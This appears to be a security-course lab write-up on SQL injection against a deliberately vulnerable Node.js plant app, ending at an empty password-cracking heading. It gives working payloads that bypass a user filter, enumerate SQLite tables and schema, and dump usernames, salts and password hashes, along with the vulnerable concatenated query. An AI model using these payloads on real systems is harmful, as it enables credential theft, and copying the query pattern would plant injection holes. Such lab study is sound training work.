# SQL Injection and Password Cracking
## Part A. Simple SQL injection
The query string inside the `node.js` code:

```js
var sql_query =
  'SELECT name, color, planttype, potsize, shared FROM plants WHERE user_id=' +
  user_id +
  ' AND name LIKE "%' +
  plant + '%";';
```

In SQL format:
```sql
SELECT name, color, planttype, potsize, shared FROM plants
WHERE user_id=user_id
AND name LIKE "%plant%";
```

SQL injection string into the `plant` variable such that it nullifies the `user_id` condition.
```
%" OR name LIKE "%
```


## Part B. SQL injection to steal password hashes
1) Find out the name of the table and columns where user data is stored.

> Every SQLite database has an SQLITE_MASTER table that defines the schema for the database. The SQLITE_MASTER table looks like this:
  ```sql
  CREATE TABLE sqlite_master (
    type TEXT,
    name TEXT,
    tbl_name TEXT,
    rootpage INTEGER,
    sql TEXT
  );
  ```
> For tables, the type field will always be 'table' and the name field will be the name of the table. So to get a list of all tables in the database, use the following SELECT command:
  ```sql
  SELECT name FROM sqlite_master
  WHERE type='table'
  ORDER BY name;
  ```
  -- https://www.sqlite.org/faq.html#q7

```sql
SELECT name, color, planttype, potsize, shared FROM plants
WHERE user_id=user_id
AND name LIKE "%
-"
UNION
SELECT * FROM sqlite_master
WHERE type='table';
--
%";
```

SQL injection string to acquire the names of the tables:
```
-" UNION SELECT * FROM sqlite_master WHERE type='table'; --
```

Output:
```
table	users	users	2
```

SQL injection string to acquire the schema of a table:
```
-" UNION SELECT sql, NULL, NULL, NULL, NULL FROM sqlite_master WHERE name='users'; --
```

Output:
```sql
CREATE TABLE users ( id INTEGER NOT NULL, username VARCHAR(50) NOT NULL, salt VARCHAR(100) NOT NULL, password VARCHAR(100) NOT NULL, PRIMARY KEY (id) )
```


2) Create an SQL injection that will retrieve and display the contents of this table.

```
-" UNION SELECT username, salt, password, NULL, NULL FROM users; --
```


## Part C. Password cracking
